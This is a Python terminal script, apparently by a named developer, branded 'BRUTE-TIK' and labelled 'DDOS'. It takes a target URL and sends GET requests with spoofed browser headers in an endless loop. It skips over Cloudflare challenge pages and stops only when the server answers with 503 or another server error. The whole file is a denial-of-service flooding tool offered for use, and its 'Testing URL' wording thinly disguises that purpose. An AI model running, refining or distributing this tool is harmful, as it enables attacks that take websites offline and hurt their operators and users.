import requests as r
import curses
from curses import wrapper
from fake_headers import Headers


class Colors:
    pass  

def print_logo(stdscr):
    stdscr.addstr(0, 0, '██████╗ ██████╗ ██╗   ██╗████████╗███████╗ ████████╗██╗██╗  ██╗', curses.color_pair(1))
    stdscr.addstr(1, 0, '██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝ ╚══██╔══╝██║██║ ██╔╝', curses.color_pair(1))
    stdscr.addstr(2, 0, '██████╔╝██████╔╝██║   ██║   ██║   █████╗█████╗██║   ██║█████╔╝ ', curses.color_pair(1))
    stdscr.addstr(3, 0, '██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝╚════╝██║   ██║██╔═██╗ ', curses.color_pair(1))
    stdscr.addstr(4, 0, '██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║   ██║██║  ██╗', curses.color_pair(1))
    stdscr.addstr(5, 0, '╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝   ╚═╝╚═╝  ╚═╝', curses.color_pair(1))
    stdscr.addstr(7, 0, '               .:.: Developer: Abdullah_M_B :.:.', curses.color_pair(2))
    stdscr.addstr(8, 4, f'           .:.: DDOS', curses.color_pair(2))

def get_user_input(stdscr, y, x, prompt):
    stdscr.addstr(y, x, prompt, curses.color_pair(4))
    stdscr.refresh()
    curses.echo()
    user_input = stdscr.getstr(y + 1, x).decode('utf-8')
    curses.noecho()
    return user_input.strip()

def main(stdscr):
    curses.curs_set(1)  
    stdscr.clear()
    stdscr.refresh()

    curses.start_color()
    curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)  
    curses.init_pair(2, curses.COLOR_YELLOW, curses.COLOR_BLACK)  
    curses.init_pair(3, curses.COLOR_RED, curses.COLOR_BLACK) 
    curses.init_pair(4, curses.COLOR_BLUE, curses.COLOR_BLACK)  
    curses.init_pair(5, curses.COLOR_YELLOW, curses.COLOR_BLACK)  
    curses.init_pair(6, curses.COLOR_CYAN, curses.COLOR_BLACK)  
    curses.init_pair(7, curses.COLOR_GREEN, curses.COLOR_BLACK)  

    print_logo(stdscr)
    stdscr.refresh()

    url = get_user_input(stdscr, 11, 20, "─[etuadmin@DDOS]─[~]─╼ #(e.g., http://example.net) >>>  ")

    headers = Headers(headers=True).generate()
    color = curses.color_pair(7)  # RAND

    session = r.Session()

    stdscr.clear()
    print_logo(stdscr)
    stdscr.addstr(10, 0, f"Testing URL: {url}", curses.color_pair(1))
    stdscr.refresh()

    try:
        row = 12
        max_y, max_x = stdscr.getmaxyx()  

        while True:
            if row >= max_y - 1:  
                row = 12
                stdscr.clear()
                print_logo(stdscr)
                stdscr.addstr(10, 0, f"Testing URL: {url}", curses.color_pair(1))

            req = session.get(url, headers=headers)

            if req.status_code == 200:
                if "<title>Just a moment...</title>" in req.text:
                    pass
                else:
                    stdscr.addstr(row, 0, f"{url} sent requests...", color)
            elif req.status_code == 503:
                stdscr.addstr(row, 0, "Server is temporarily unavailable (503 Service Unavailable)", curses.color_pair(3))
                break
            elif req.status_code >= 500:
                stdscr.addstr(row, 0, f"Server error (status code {req.status_code})", curses.color_pair(3))
                break
            else:
                stdscr.addstr(row, 0, f"Received unexpected status code: {req.status_code}", curses.color_pair(5))

            stdscr.refresh()
            row += 1  
            

    except r.RequestException as e:
        stdscr.addstr(row, 0, f"Request exception occurred: {e}", curses.color_pair(3))
        stdscr.refresh()
        stdscr.getch()
    except Exception as e:
        stdscr.addstr(row, 0, f"An unexpected error occurred: {e}", curses.color_pair(3))
        stdscr.refresh()
        stdscr.getch()

    stdscr.refresh()
    stdscr.getch()

if __name__ == "__main__":
    wrapper(main)
